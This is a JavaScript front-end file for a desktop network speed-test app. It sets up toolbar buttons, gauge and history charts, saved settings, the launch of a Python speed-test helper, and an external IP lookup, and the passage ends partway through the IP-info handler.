/**
 * Created by Ian on 2014/8/8.
 */

(function(){
    window['UI'] = window['UI'] || {};
    window.UI.c$ = window.UI.c$ || {};
})();


(function(){
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    var c$ = {};
    c$ = $.extend(window.UI.c$,{});

    c$.log = function(message, isError){
        kendoConsole.log(message, isError, "#-log");
    };

    /**
     * 初始化标题及版本
     */
    c$.initTitleAndVersion = function(){
        document.title = BS.b$.App.getAppName();
    };

    /**
     * 初始化Toolbar
     */
    c$.initToolbar = function(){

        $('#toolbar').kendoToolBar({
            items:[
                { type: "button", id:'toolBtn-ip', text: "Show IP", enable: true, click: c$.actions.onIPInfoClick},
                { type: "button", id:'toolBtn-history', text: "Temp History", enable: false, icon:"clock",click: c$.actions.onHistoryClick},
                { type: "button", id:'toolBtn-fullHistory', text: "Full History", enable: false, icon:"clock",click: c$.actions.onFullHistoryClick},
                { type: "button", id:'toolBtn-feedback', text: "FAQ",click: c$.actions.onFeedbackClick},
                BS.b$.App.getSandboxEnable() == true ? { type: "button", id:'toolBtn-review', text: "Rate App",click: c$.actions.onReviewClick} : {},
                { type: "separator", spriteCssClass: "flex-width" },
                {template: "<div><img src='images/logo_64.png' width='36' onclick='UI.c$.actions.onHomePageClick();'/><span data='version'>Ver " + BS.b$.App.getAppVersion()+ "</span></div>"}
            ]
        });

        $("#btnStart").kendoButton({
           click:c$.actions.onStartSpeedTestClick
        });
    };


    c$.ctrlToolbar = {
        // 让HistoryBtn 可用
        enableHistoryBtn: function(enable){
            if(enable && enable == true){
                $('#toolbar').data("kendoToolBar").enable("#toolBtn-history");
                $('#toolBtn-history').css({"-webkit-animation":"twinkling 1.5s 5 ease-in-out"});
            }else{
                $('#toolbar').data("kendoToolBar").enable("#toolBtn-history", false);
            }
        },

        enableFullHistoryBtn: function(enable){
            if(enable && enable == true){
                $('#toolbar').data("kendoToolBar").enable("#toolBtn-fullHistory");
            }else{
                $('#toolbar').data("kendoToolBar").enable("#toolBtn-fullHistory", false);
            }
        },

        hideFeedbackAndReviewBtn:function(hide){
            if(hide && hide == true){
                $("#toolBtn-feedback").css('visibility','hidden');
                $("#toolBtn-review").css('visibility','hidden');
            }else{
                $("#toolBtn-feedback").css('visibility','visible');
                $("#toolBtn-review").css('visibility','visible');
            }
        },

        hideIPBtn:function(hide){
            if(hide && hide == true){
                $("#toolBtn-ip").css('visibility','hidden');
            }else{
                $("#toolBtn-ip").css('visibility','visible');
            }
        },

        // 控制IP按钮
        enableIPBtn:function(enable){
            if(enable && enable == true){
                $('#toolbar').data("kendoToolBar").enable("#toolBtn-ip");
            }else{
                $('#toolbar').data("kendoToolBar").enable("#toolBtn-ip", false);
            }
        },

        // 控制开始按钮
        enableStartBtn: function(enable){
            if(enable && enable == true){
                $('#btnStart').data("kendoButton").enable(true);
            }else{
                $('#btnStart').data("kendoButton").enable(false);
            }
        }
    };

    // 初始化测试界面{选项及页面设置}
    c$.UI_speed_option = {
        backgroundColor: '#1b1b1b',
        tooltip : {
            formatter: "{a} <br/>{c} {b}"
        },
        toolbox: {
            show : false,
            feature : {
                saveAsImage : {show: true}
            }
        },
        series : [
            {
                name:'Ping',
                type:'gauge',
                center : ['12%', '55%'],    // 默认全局居中
                radius : '50%',
                min:0,
                max:360,
                endAngle:45,
                splitNumber:3,
                axisLine: {            // 坐标轴线
                    lineStyle: {       // 属性lineStyle控制线条样式
                        color: [[0.29, 'lime'],[0.86, '#1e90ff'],[1, '#ff4500']],
                        width: 2,
                        shadowColor : '#fff', //默认透明
                        shadowBlur: 10
                    }
                },
                axisLabel: {            // 坐标轴小标记
                    textStyle: {       // 属性lineStyle控制线条样式
                        fontWeight: 'bolder',
                        color: '#fff',
                        shadowColor : '#fff', //默认透明
                        shadowBlur: 10
                    }
                },
                axisTick: {            // 坐标轴小标记
                    length :12,        // 属性length控制线长
                    lineStyle: {       // 属性lineStyle控制线条样式
                        color: 'auto',
                        shadowColor : '#fff', //默认透明
                        shadowBlur: 10
                    }
                },
                splitLine: {           // 分隔线
                    length :20,         // 属性length控制线长
                    lineStyle: {       // 属性lineStyle（详见lineStyle）控制线条样式
                        width:3,
                        color: '#fff',
                        shadowColor : '#fff', //默认透明
                        shadowBlur: 10
                    }
                },
                pointer: {
                    width:5,
                    shadowColor : '#fff', //默认透明
                    shadowBlur: 5
                },
                title : {
                    offsetCenter: [0, '-30%'],       // x, y，单位px
                    textStyle: {       // 其余属性默认使用全局文本样式，详见TEXTSTYLE
                        fontWeight: 'bolder',
                        fontStyle: 'italic',
                        color: '#fff',
                        fontSize: 12,
                        shadowColor : '#fff', //默认透明
                        shadowBlur: 10
                    }
                },
                detail : {
                    //backgroundColor: 'rgba(30,144,255,0.8)',
                    // borderWidth: 1,
                    borderColor: '#fff',
                    shadowColor : '#fff', //默认透明
                    shadowBlur: 5,
                    width: 80,
                    height:30,
                    offsetCenter: [25, '20%'],       // x, y，单位px
                    textStyle: {       // 其余属性默认使用全局文本样式，详见TEXTSTYLE
                        fontWeight: 'bolder',
                        color: '#fff'
                    }
                },
                data:[{value: 0, name: 'ms'}]
            },
            {
                name:'Download Speed',
                type:'gauge',
                center : ['35%', '50%'],    // 默认全局居中
                min:0,
                max:32,
                splitNumber:16,
                axisLine: {            // 坐标轴线
                    lineStyle: {       // 属性lineStyle控制线条样式
                        color: [[0.09, '#7EC0EE'],[0.82, '#EEC900'],[1, '#ff4500']],
                        width: 3,
                        shadowColor : '#fff', //默认透明
                        shadowBlur: 10
                    }
                },
                axisLabel: {            // 坐标轴小标记
                    textStyle: {       // 属性lineStyle控制线条样式
                        fontWeight: 'bolder',
                        color: '#fff',
                        shadowColor : '#fff', //默认透明
                        shadowBlur: 10
                    }
                },
                axisTick: {            // 坐标轴小标记
                    length :15,        // 属性length控制线长
                    lineStyle: {       // 属性lineStyle控制线条样式
                        color: 'auto',
                        shadowColor : '#fff', //默认透明
                        shadowBlur: 10
                    }
                },
                splitLine: {           // 分隔线
                    length :25,         // 属性length控制线长
                    lineStyle: {       // 属性lineStyle（详见lineStyle）控制线条样式
                        width:3,
                        color: '#fff',
                        shadowColor : '#fff', //默认透明
                        shadowBlur: 10
                    }
                },
                pointer: {           // 分隔线
                    shadowColor : '#fff', //默认透明
                    shadowBlur: 5
                },
                title : {
                    textStyle: {       // 其余属性默认使用全局文本样式，详见TEXTSTYLE
                        fontWeight: 'bolder',
                        fontSize: 20,
                        fontStyle: 'italic',
                        color: '#fff',
                        shadowColor : '#fff', //默认透明
                        shadowBlur: 10
                    }
                },
                detail : {
                    formatter:'{value}',
                    backgroundColor: 'rgba(30,144,255,0.6)',
                    borderWidth: 1,
                    borderColor: '#fff',
                    shadowColor : '#fff', //默认透明
                    shadowBlur: 5,
                    offsetCenter: [0, '55%'],       // x, y，单位px
                    textStyle: {       // 其余属性默认使用全局文本样式，详见TEXTSTYLE
                        fontWeight: 'bolder',
                        color: '#fff',
                        fontSize: 24
                    }
                },
                data:[{value: 0, name: 'Mbits/s'}]
            },
            {
                name:'Upload Speed',
                type:'gauge',
                center : ['65%', '50%'],    // 默认全局居中
                min:0,
                max:8,
                splitNumber:16,
                axisLine: {            // 坐标轴线
                    lineStyle: {       // 属性lineStyle控制线条样式
                        color: [[0.82, '#FFA54F'],[0.90, '#1e90ff'],[1, '#ff4500']],
                        width: 3,
                        shadowColor : '#fff', //默认透明
                        shadowBlur: 10
                    }
                },
                axisLabel: {            // 坐标轴小标记
                    textStyle: {       // 属性lineStyle控制线条样式
                        fontWeight: 'bolder',
                        color: '#fff',
                        shadowColor : '#fff', //默认透明
                        shadowBlur: 10
                    }
                },
                axisTick: {            // 坐标轴小标记
                    length :15,        // 属性length控制线长
                    lineStyle: {       // 属性lineStyle控制线条样式
                        color: 'auto',
                        shadowColor : '#fff', //默认透明
                        shadowBlur: 10
                    }
                },
                splitLine: {           // 分隔线
                    length :25,         // 属性length控制线长
                    lineStyle: {       // 属性lineStyle（详见lineStyle）控制线条样式
                        width:3,
                        color: '#fff',
                        shadowColor : '#fff', //默认透明
                        shadowBlur: 10
                    }
                },
                pointer: {           // 分隔线
                    shadowColor : '#fff', //默认透明
                    shadowBlur: 5
                },
                title : {
                    textStyle: {       // 其余属性默认使用全局文本样式，详见TEXTSTYLE
                        fontWeight: 'bolder',
                        fontSize: 20,
                        fontStyle: 'italic',
                        color: '#fff',
                        shadowColor : '#fff', //默认透明
                        shadowBlur: 10
                    }
                },
                detail : {
                    formatter:'{value}',
                    backgroundColor: 'rgba(30,144,255,0.2)',
                    borderWidth: 1,
                    borderColor: '#fff',
                    shadowColor : '#fff', //默认透明
                    shadowBlur: 2,
                    offsetCenter: [0, '55%'],       // x, y，单位px
                    textStyle: {       // 其余属性默认使用全局文本样式，详见TEXTSTYLE
                        fontWeight: 'bolder',
                        color: '#fff',
                        fontSize: 24
                    }
                },
                data:[{value: 0, name: 'Mbits/s'}]
            },
            {
                name:'Running',
                type:'gauge',
                center : ['88%', '55%'],    // 默认全局居中
                radius : '50%',
                min:0,
                max:100,
                startAngle:135,
                //endAngle:45,
                splitNumber:2,
                axisLine: {            // 坐标轴线
                    lineStyle: {       // 属性lineStyle控制线条样式
                        color: [[0.2, 'lime'],[0.8, '#1e90ff'],[1, '#ff4500']],
                        width: 2,
                        shadowColor : '#fff', //默认透明
                        shadowBlur: 10
                    }
                },
                axisTick: {            // 坐标轴小标记
                    length :12,        // 属性length控制线长
                    lineStyle: {       // 属性lineStyle控制线条样式
                        color: 'auto',
                        shadowColor : '#fff', //默认透明
                        shadowBlur: 10
                    }
                },
                axisLabel: {
                    textStyle: {       // 属性lineStyle控制线条样式
                        fontWeight: 'bolder',
                        color: '#fff',
                        shadowColor : '#fff', //默认透明
                        shadowBlur: 10
                    },
                    formatter:function(v){
                        switch (v + '') {
                            case '0' : return '0';
                            case '1' : return '50%';
                            case '2' : return '1';
                        }
                    }
                },
                splitLine: {           // 分隔线
                    length :15,         // 属性length控制线长
                    lineStyle: {       // 属性lineStyle（详见lineStyle）控制线条样式
                        width:3,
                        color: '#fff',
                        shadowColor : '#fff', //默认透明
                        shadowBlur: 10
                    }
                },
                pointer: {
                    width:2,
                    shadowColor : '#fff', //默认透明
                    shadowBlur: 5
                },
                title : {
                    show: false
                },
                detail : {
                    show: true,
                    formatter:'Running',
                    borderColor: '#fff',
                    shadowColor : '#fff', //默认透明
                    shadowBlur: 5,
                    offsetCenter: [0, '5%'],       // x, y，单位px
                    textStyle: {       // 其余属性默认使用全局文本样式，详见TEXTSTYLE
                        fontWeight: 'bolder',
                        fontSize: 18,
                        color: '#fff'
                    }
                },
                data:[{value: 0, name: 'step'}]
            }
        ]
    };
    c$.createSpeedTestUI = function(){
        // 基于准备好的dom，初始化echarts图表
        c$.UI_speed = echarts.init(document.getElementById('speed-canvas'));

        // 为echarts对象加载数据
        c$.UI_speed.setOption(c$.UI_speed_option);

        // 重置当前SpeedTest状态
        c$.resetSpeedTestUI();
    };

    // 重置SpeedTestUI页面
    c$.resetSpeedTestUI = function(){
        c$.ctrlSpeedTestUI.setPingTimes(0);
        c$.ctrlSpeedTestUI.setDownloadSpeed({speed:0, unit:'Mbits/s'});
        c$.ctrlSpeedTestUI.setUploadSpeed({speed:0, unit:'Mbits/s'});
        c$.ctrlSpeedTestUI.setRunningValue(false);
    };

    // 控制SpeedTestUI的数据
    c$.ctrlSpeedTestUI = {
        // 更新Scale
        updateScale:function(data){
            c$.UI_speed_option.series[0].max = data.pingScale;
            c$.UI_speed_option.series[1].max = data.downloadScale;
            c$.UI_speed_option.series[2].max = data.uploadScale;

            if(c$.UI_speed){
                c$.UI_speed.setOption(c$.UI_speed_option, true);
            }
        },

        // 设置Ping的时间
        setPingTimes:function(data){
            c$.UI_speed_option.series[0].data[0].value = (data).toFixed(2);
            c$.UI_speed_option.series[0].data[0].name = '\n Ping \n ms';
            c$.UI_speed.setOption(c$.UI_speed_option, true);

            c$.tmp_History_dataObj.ping = data;
        },

        // 设置下载速度
        setDownloadSpeed:function(data){
            c$.UI_speed_option.series[1].data[0].value = data.speed;
            c$.UI_speed_option.series[1].data[0].name = '\n Download \n ' + (data.unit || 'Mbits/s');
            c$.UI_speed.setOption(c$.UI_speed_option, true);

            c$.tmp_History_dataObj.download = data.speed;
            c$.tmp_FullHistory_dataObj.download = data.speed;
        },

        // 设置上传速度
        setUploadSpeed:function(data){
            c$.UI_speed_option.series[2].data[0].value = data.speed;
            c$.UI_speed_option.series[2].data[0].name ='\n Upload \n ' + (data.unit || 'Mbits/s');
            c$.UI_speed.setOption(c$.UI_speed_option, true);

            c$.tmp_History_dataObj.upload = data.speed;
            c$.tmp_FullHistory_dataObj.upload = data.speed;
        },

        // 设置Running的数据
        setRunningValue:function(wantStart){
            function startRunning(){
                c$.running_timeTicket = setInterval(function(){
                    c$.UI_speed_option.series[3].data[0].value = (Math.random()*100).toFixed(2) - 0;
                    c$.UI_speed_option.series[3].detail.formatter = "Running";
                    c$.UI_speed.setOption(c$.UI_speed_option, true);
                },400)
            }

            function stopRunning(){
                c$.UI_speed_option.series[3].data[0].value = 0;
                c$.UI_speed_option.series[3].detail.formatter = "Waiting";
                c$.UI_speed.setOption(c$.UI_speed_option, true);
            }

            if(wantStart == false){
                c$.running_timeTicket && clearInterval(c$.running_timeTicket);
                c$.running_timeTicket = null;
                stopRunning();
                return;
            }

            if(typeof c$.running_timeTicket == 'undefined' || c$.running_timeTicket == null){
                startRunning();
            }else{
                clearInterval(c$.running_timeTicket);
                c$.running_timeTicket = null;
                stopRunning();
            }
        }
    };

    // 设置配置选项
    c$.settingsConfig_default = {
        pingScale:360,
        downloadScale:32,
        uploadScale:8
    };

    c$.settingsConfig = {
        current: function(){
            return c$.settingsConfig_default;
        }(),

        load:function(){
            var settings = window.localStorage.getItem('settings_speedtest') || null;
            if(settings){
                var obj = JSON.parse(settings);
                c$.settingsConfig.current = obj;

                // 关联到UI SpeedTest设置选项
                c$.ctrlSpeedTestUI.updateScale(c$.settingsConfig.current);
            }
        },

        save:function(){
            if(c$.settingsConfig.current){

                // 关联到UI SpeedTest设置选项
                c$.ctrlSpeedTestUI.updateScale(c$.settingsConfig.current);

                var dataStr = JSON.stringify(c$.settingsConfig.current);
                window.localStorage.setItem('settings_speedtest', dataStr);
            }
        }
    };

    c$.openSettingsWindow = function(e){
        var settingsWindow = $('#settings-window');
        var currentSettings = c$.settingsConfig.current;
        if(!settingsWindow.data('kendoWindow')){
            settingsWindow.kendoWindow({
                actions: ["Close"],
                title: "Preferences",
                width: '360px',
                height: '180px',
                resizable: false,
                model:true
            });


            var contentTemplate = kendo.template($('#template-window-settings').html());
            settingsWindow.html(contentTemplate({}));

            //初始化配置选项
            $('#settings-app-ui-ping').kendoNumericTextBox({
                min:6,
                max:6000,
                format: 'n0',
                value:currentSettings.pingScale,
                step:6
            });
            $('#settings-app-ui-download').kendoNumericTextBox({
                min:4,
                max:220,
                format: 'n0',
                value:currentSettings.downloadScale,
                step:4
            });
            $('#settings-app-ui-upload').kendoNumericTextBox({
                min:2,
                max:220,
                format: 'n0',
                value:currentSettings.uploadScale,
                step:2
            });

            //绑定事件
            $(".settings-panel .k-footer .k-button:first-child").on('click', function(event){
                c$.settingsConfig.current = $.objClone(c$.settingsConfig_default);
                var current = c$.settingsConfig.current;
                $('#settings-app-ui-ping').data("kendoNumericTextBox").value(current.pingScale);
                $('#settings-app-ui-download').data("kendoNumericTextBox").value(current.downloadScale);
                $('#settings-app-ui-upload').data("kendoNumericTextBox").value(current.uploadScale);

                c$.settingsConfig.save();
            });

            $("div.settings-panel > div.k-footer > button:nth-child(2)").on('click', function(event){
                // 设置选项
                c$.settingsConfig.current = {
                    pingScale: function(){
                        return $('#settings-app-ui-ping').data("kendoNumericTextBox").value()
                    }(),
                    downloadScale:function(){
                        return $('#settings-app-ui-download').data("kendoNumericTextBox").value()
                    }(),
                    uploadScale:function(){
                        return $('#settings-app-ui-upload').data("kendoNumericTextBox").value()
                    }()
                };
                c$.settingsConfig.save();
            });
        }

        var w = settingsWindow.data("kendoWindow");
        w.center();
        w.open();
    };

    c$.openIpInfoWindow = function(e){
        var ipInfoWindow = $('#ipinfo-window');
        if(!ipInfoWindow.data('kendoWindow')){
            ipInfoWindow.kendoWindow({
                actions: ["Close"],
                title: "IP Information",
                width: '360px',
                height: '360px',
                model:true,
                resizable: true
            });

            var ipinfoTemplate = kendo.template($('#template-window-ipinfo').html());
            ipInfoWindow.html(ipinfoTemplate({}));

            //create ipinfo data and refreshUI
            c$.ctrlIpInfoUI.createIpInfoList();
            c$.ctrlIpInfoUI.refreshUI();
        }
        
        c$.ctrlIpInfoUI.refreshUI();
        var w = ipInfoWindow.data("kendoWindow");
        w.center();
        w.open();
    };

    c$.UI_ipinfo_data = [
//        {key:'', value:'Local IP info', groupClass:'item-group', enableLocation:false}
//        ,{key:'ip', value:'127.0.0.1', groupClass:'', enableLocation:false}
    ];

    c$.ctrlIpInfoUI = {
        createIpInfoList:function(){
            c$.ds_ipInfo = kendo.data.DataSource.create({
                data:c$.UI_ipinfo_data
            });

            $('#ip-grid').kendoGrid({
                dataSource:c$.ds_ipInfo,
                height: 300,
                scrollable: true,
                selectable: "row",
                rowTemplate: kendo.template($("#viewTemplate-ipinfo-item").html()),
                columns:[
                    {hidden: true, field:"key"}
                ]
            })
        },

        updateIpInfoData:function(IPInfoDataList){
            c$.ds_ipInfo = IPInfoDataList;
        },

        refreshUI:function(){
            var old_ds_ipInfo = c$.ds_ipInfo;
            delete old_ds_ipInfo;

            c$.ds_ipInfo = kendo.data.DataSource.create({
                data:c$.UI_ipinfo_data
            });


            $('#ip-grid').data('kendoGrid').setDataSource(c$.ds_ipInfo);
        }
    };

    // 初始化，或者检测IP信息
    c$.checkIPInfo = function(){
        c$.actions.onGetIPInfoClick();
    };

    c$.openHistoryWindow = function(e){
        var historyWindow = $('#history-window');
        if(!historyWindow.data('kendoWindow')){
             historyWindow.kendoWindow({
                actions: ["Close"],
                title: "Least Recently History (Most 5 Records)",
                modal: true,
                 resizable: false
            });

            var historyTemplate = kendo.template($('#template-window-history').html());
            historyWindow.html(historyTemplate({}));

            c$.createHistoryChat();
            c$.ctrlHistoryUI.refreshUI();
        }

        var w = historyWindow.data("kendoWindow");
        w.center();
        w.open();

    };

    c$.openFullHistoryWindow = function(e){
        var fullHistorywindow = $('#fullHistory-window');
        if(!fullHistorywindow.data('kendoWindow')){
            fullHistorywindow.kendoWindow({
                actions: ["Close"],
                title: "Full History",
                modal: true,
                resizable: false
            });

            var historyTemplate = kendo.template($('#template-window-fullHistory').html());
            fullHistorywindow.html(historyTemplate({}));

            c$.FullHistoryActions.createFullHistoryChat();
            c$.FullHistoryActions.refresh();

        }

        var w = fullHistorywindow.data("kendoWindow");
        w.center();
        w.open();
    };

    c$.tmp_FullHistory_dataObj = {
        time:null,
        download:null,
        upload:null
    };
    c$.UI_FullHistory_option_data = [];
    c$.UI_FullHistory = null;
    c$.FullHistoryActions = {

        // 老版本转换
        oldVersion2new:function(historyJson){
            var dataList = [];
            try{
                $.each(historyJson, function(index0, obj0){

                    var obj0_symbol = obj0["symbol"];
                    var obj0_date = obj0["date"];
                    var obj0_speed = obj0["speed"];

                    $.each(historyJson, function(index1, obj1){
                        var obj1_symbol = obj1["symbol"];
                        var obj1_date = obj1["date"];
                        var obj1_speed = obj1["speed"];

                        if((obj0_symbol == "Download")
                            && (obj1_symbol == "Upload")
                            && (obj0_date == obj1_date)){

                            var data = $.objClone(c$.tmp_FullHistory_dataObj);
                            data.time = obj0_date;
                            data.download = obj0_speed;
                            data.upload = obj1_speed;

                            dataList.push(data);
                        }

                    });
                });
            }catch(e){console.error(e)}
            return dataList;
        },

        // 加载全部历史记录
        loadFullHistory:function(){
            try{
                var testHistory = [], oldVersion_history, newVersion_history;
                oldVersion_history = window.localStorage.getItem('speedtest_history') || null;
                if(oldVersion_history){
                    //转换成新的测试历史记录
                    var historyJson = (oldVersion_history != null) ? JSON.parse(oldVersion_history) : [];
                    //需要提供一个函数来解决转换问题
                    testHistory = testHistory.concat(c$.FullHistoryActions.oldVersion2new(historyJson));
                    //转换完成后，要删除
                    window.localStorage.removeItem('speedtest_history');

                    //保存历史
                    c$.UI_FullHistory_option_data = testHistory;
                    c$.FullHistoryActions.saveFullHistory();
                }

                //监测新版本的历史记录
                newVersion_history = window.localStorage.getItem('fullHistory_speedtest') || null;
                if(newVersion_history){
                    var historyJson = (newVersion_history != null) ? JSON.parse(newVersion_history) : [];
                    testHistory = testHistory.concat(historyJson);
                }


                c$.UI_FullHistory_option_data = testHistory;

                if(c$.UI_FullHistory_option_data.length > 0){

                	c$.ctrlToolbar.enableFullHistoryBtn(true);
                }

            }catch(e){console.warn(e)}

        },

        // 保存全部历史记录
        saveFullHistory:function(){
            try{
                var dataStr = JSON.stringify(c$.UI_FullHistory_option_data);
                window.localStorage.setItem("fullHistory_speedtest",dataStr );
            }catch(e) {
                console.warn(e);
            }
        },

        // 清除全部历史记录
        clearFullHistory:function(){
            var message = {
                title:"Clear All History ?",
                message:"Do you want to clear all speed test history after restart?",
                buttons:["Clear","Cancel"],
                alertType:"Alert"
            };

            var result = BS.b$.Notice.alert(message);
            if(result == 1){
                window.localStorage.removeItem('fullHistory_speedtest');
                c$.UI_FullHistory_option_data = [];
                c$.FullHistoryActions.refresh();
            }

        },

        // 添加新的历史记录
        addNewHistory:function(){
            var data = $.objClone(c$.tmp_FullHistory_dataObj);
            data.time = $.getMyDateStr("hh:mm:ss yyyy-MM-dd");

            // 添加新元素
            c$.UI_FullHistory_option_data.push(data);

            // 激活历史按钮
            c$.ctrlToolbar.enableFullHistoryBtn(true);

            // 保存数据
            c$.FullHistoryActions.saveFullHistory();

            // 刷新数据
            c$.FullHistoryActions.refresh();
        },

        // 刷新历史记录
        refresh:function(){
            if(c$.UI_FullHistory && c$.UI_FullHistory_option){
                c$.UI_FullHistory_option.xAxis[0].data = []; // 时间
                c$.UI_FullHistory_option.series[0].data = []; // 下载速度
                c$.UI_FullHistory_option.series[1].data = []; // 上传速度


                $.each(c$.UI_FullHistory_option_data, function(index, obj){
                    c$.UI_FullHistory_option.xAxis[0].data.push(obj.time);
                    c$.UI_FullHistory_option.series[0].data.push(obj.download);
                    c$.UI_FullHistory_option.series[1].data.push(obj.upload);
                });

                if(c$.UI_FullHistory_option_data.length > 0){
                    c$.UI_FullHistory.setOption(c$.UI_FullHistory_option, true);
                }
            }
        },

        createFullHistoryChat:function(){
            //$("#speed-history")
            c$.UI_FullHistory = echarts.init($('#fullHistory-canvas')[0]);
            c$.UI_FullHistory_option_toolbar = {
                show : true,
                feature : {
                    clear:{
                        show: true,
                        title: 'Clear History',
                        icon: '',
                        onclick: function(){
                            c$.FullHistoryActions.clearFullHistory();
                        }
                    },
                    mark : {
                        show: true,
                        title: {
                            mark: 'Auxiliary line - switch',
                            markUndo : 'Auxiliary line  - remove',
                            markClear : 'Auxiliary line - clear'
                        }
                    },
                    dataZoom : {
                        show: true,
                        title:{
                            dataZoom : 'Regional Scale',
                            dataZoomReset : 'Regional Scale - back'
                        }
                    },
                    dataView : {
                        show: false,
                        title: 'Data View'
                    },
                    magicType : {
                        show: true,
                        title:{
                            line: 'Line Chart',
                            bar: 'Column Chart',
                            stack: 'accumulation',
                            tiled: 'Tile'
                        },
                        type: ['line', 'bar', 'stack', 'tiled']
                    },
                    restore : {
                        show: true,
                        title:'Restore',
                        color: 'black'
                    },
                    saveAsImage : {
                        show: false,
                        title: 'Save as image'
                    }
                }
            };

            c$.UI_FullHistory_option = {
                tooltip : {
                    trigger: 'axis'
                },
                legend: {
                    data:['Download','Upload']
                },
                toolbox: c$.UI_FullHistory_option_toolbar,
                calculable : false,
                dataZoom : {
                    show : true,
                    realtime : true,
                    start : 20,
                    end : 80
                },
                xAxis : [
                    {
                        type : 'category',
                        boundaryGap : false,
                        data : function (){
                            var list = [];
                            for (var i = 1; i <= 30; i++) {
                                list.push('2013-03-' + i);
                            }
                            return list;
                        }()
                    }
                ],
                yAxis : [
                    {
                        type : 'value'
                    }
                ],
                series : [
                    {
                        name:'Download',
                        type:'line',
                        data:function (){
                            var list = [];
                            for (var i = 1; i <= 30; i++) {
                                list.push(Math.round(Math.random()* 30));
                            }
                            return list;
                        }()
                    },
                    {
                        name:'Upload',
                        type:'line',
                        data:function (){
                            var list = [];
                            for (var i = 1; i <= 30; i++) {
                                list.push(Math.round(Math.random()* 30));
                            }
                            return list;
                        }()
                    }
                ]
            };
            
        }

    };

    c$.UI_history_option_data = [
//        {time:'09/16 02:57', ping:0, download:25, upload:4.8}
    ];
    c$.UI_history = null;
    c$.createHistoryChat = function(){
        c$.UI_history = echarts.init($('#history-canvas')[0]);
        c$.UI_history_option = {
            tooltip : {
                trigger: 'axis'
            },
            toolbox: {
                show: true,
                feature : {
                    mark : {
                        show: true,
                        title: {
                            mark: 'Auxiliary line - switch',
                            markUndo : 'Auxiliary line  - remove',
                            markClear : 'Auxiliary line - clear'
                        }
                    },
                    dataZoom : {
                        show: true,
                        title:{
                            dataZoom : 'Regional Scale',
                            dataZoomReset : 'Regional Scale - back'
                        }
                    },
                    dataView : {
                        show: false,
                        title: 'Data View'
                    },
                    magicType : {
                        show: true,
                        title:{
                            line: 'Line Chart',
                            bar: 'Column Chart',
                            stack: 'accumulation',
                            tiled: 'Tile'
                        },
                        type: ['line', 'bar', 'stack', 'tiled']
                    },
                    restore : {
                        show: true,
                        title:'Restore',
                        color: 'black'
                    },
                    saveAsImage : {
                        show: false,
                        title: 'Save as image'
                    }
                }
            },
            calculable : false,
            legend: {
                data:['Download Speed','Upload Speed','Ping']
            },
            xAxis : [
                {
                    type : 'category',
                    data : ['09/16 02:57','09/16 02:57','09/16 02:57','09/16 02:57', '09/16 02:57']
                }
            ],
            yAxis : [
                {
                    type : 'value',
                    name : 'Speed',
                    axisLabel : {
                        formatter: '{value} Mbits/s'
                    }
                },
                {
                    type : 'value',
                    name : 'Response',
                    axisLabel : {
                        formatter: '{value} ms'
                    }
                }
            ],
            series : [

                {
                    name:'Download Speed',
                    type:'bar',
                    data:[2.0, 4.9, 7.0, 23.2, 15.8]
                },
                {
                    name:'Upload Speed',
                    type:'bar',
                    data:[2.6, 5.9, 9.0, 26.4, 3.4]
                },
                {
                    name:'Ping',
                    type:'line',
                    yAxisIndex: 1,
                    data:[2.0, 2.2, 3.3, 4.5, 6.5]
                }
            ]
        };



    };

    // 临时历史数据对象
    c$.tmp_History_dataObj = {
        time:null ,
        download:null,
        upload:null,
        ping:null
    };

    // 控制历史数据UI
    c$.ctrlHistoryUI = {
        /**
         c$.UI_history_option_data = [
         {time:'09/16 02:57', ping:0, download:25, upload:4.8}
         ];
         */
        addNewHistory:function(){
            var data = $.objClone(UI.c$.tmp_History_dataObj);
            data.time = $.getMyDateStr("MM/dd hh:mm:ss");

            if(c$.UI_history_option_data.length > 4){
                c$.UI_history_option_data.shift(); // 移除最前面的一个元素
            }

            // 添加新元素
            c$.UI_history_option_data.push(data);

            // 激活历史按钮
            c$.ctrlToolbar.enableHistoryBtn(true);

            // 刷新数据
            c$.ctrlHistoryUI.refreshUI();

        },

        getHistoryData:function(){
            return c$.UI_history_option_data;
        },

        clearHistory:function(){
            c$.UI_history_option_data = [];
        },

        refreshUI:function(){
            if(c$.UI_history && c$.UI_history_option){
                c$.UI_history_option.xAxis[0].data = []; // 时间
                c$.UI_history_option.series[0].data = []; // 下载速度
                c$.UI_history_option.series[1].data = []; // 上传速度
                c$.UI_history_option.series[2].data = []; // Ping的响应时间


                $.each(c$.UI_history_option_data, function(index, obj){
                    c$.UI_history_option.xAxis[0].data.push(obj.time);
                    c$.UI_history_option.series[0].data.push(obj.download);
                    c$.UI_history_option.series[1].data.push(obj.upload);
                    c$.UI_history_option.series[2].data.push(obj.ping);
                });

                if(c$.UI_history_option_data.length > 0){
                    c$.UI_history.setOption(c$.UI_history_option, true);
                }
            }
        }
    };

    c$.actions = {
        // 启动测试网速
        onStartSpeedTestClick:function(e){

            try{
                // 重置当前SpeedTest状态
                c$.resetSpeedTestUI();

                //同步得到真实的插件数据
                var copyPlugin = $.objClone(c$.corePluginsMap.PythonHelperPlugin);
                var tool_id = "'speedtest'";
                var workDir = "'" + BS.b$.pNative.path.resource() + "/data/python" + "'";
                var resourceDir = "'" + BS.b$.pNative.path.homeDir() + "'";
                var configFile = "'Resources/config.plist'";
                copyPlugin.tool.command = ["-i",tool_id,
                    "-c",configFile,
                    "-r",resourceDir,
                    "-w",workDir];
                var assTaskId = (new Date()).getTime();
                BS.b$.createTask(copyPlugin.callMethod, assTaskId, [copyPlugin.tool]);

                $('#btnStart').css({"-webkit-animation":"none"});
                $('#toolBtn-history').css({"-webkit-animation":"none"});
            }catch(e){console.log(e)}


        },

        // 获取IP信息
        onGetIPInfoClick:function(e){
            //同步得到真实的插件数据
            c$.UI_ipinfo_data = [];

            //本地IP地址
            try{
                var localIP = BS.b$.App.getLocalIP();
                c$.UI_ipinfo_data.push({key:'', value:'Local IP info', groupClass:'item-group', enableLocation:false});
                c$.UI_ipinfo_data.push({key:'IP:  ', value:localIP, groupClass:'', enableLocation:false});
            }catch(e){console.error(e)}

            //处理外部IP地址
            $.getJSON('http://freegeoip.net/json', function(data){
                if(typeof data == 'object'){
                    try{
                        c$.UI_ipinfo_data.push({key:'', value:'External IP info', groupClass:'item-group', enableLocation:false});
                        c$.UI_ipinfo_data.push({key:'IP:  ', value:data["ip"], groupClass:'', enableLocation:false});
                        c$.UI_ipinfo_data.push({key:'City:  ', value:data["city"], groupClass:'', enableLocation:false});
                        c$.UI_ipinfo_data.push({key:'PostalCode:  ', value:data["zipcode"], groupClass:'', enableLocation:false});
